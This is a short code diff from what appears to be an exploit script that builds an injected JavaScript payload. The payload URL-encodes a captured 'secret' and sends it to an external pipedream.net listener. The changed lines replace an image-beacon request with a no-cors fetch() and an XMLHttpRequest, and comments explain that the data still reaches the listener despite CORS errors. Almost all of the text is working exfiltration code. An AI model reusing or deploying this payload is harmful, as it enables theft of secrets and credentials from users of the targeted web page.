@@ -43,8 +43,17 @@
                     "var encodedSecret = encodeURIComponent(secret);" +
                     
                     // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
-                    "var img = new Image();" +
-                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +
+                    "var exfil_url = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +
+
+                    // The request is sent, but if the response doesn't have the correct
+                    // CORS header (Access-Control-Allow-Origin), the JavaScript will get an error,
+                    // but the data still reaches the listener (the server) before the error occurs.
+                    "fetch(exfil_url, { mode: 'no-cors' }).catch(e => console.log('Exfiltration request sent (CORS error expected).'));" +
+
+                    // Example using XMLHttpRequest (XHR)
+                    "var xhr = new XMLHttpRequest();" +
+                    'xhr.open("GET", exfil_url, true);' + 
+                    "xhr.send();" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
                 "} else {" +
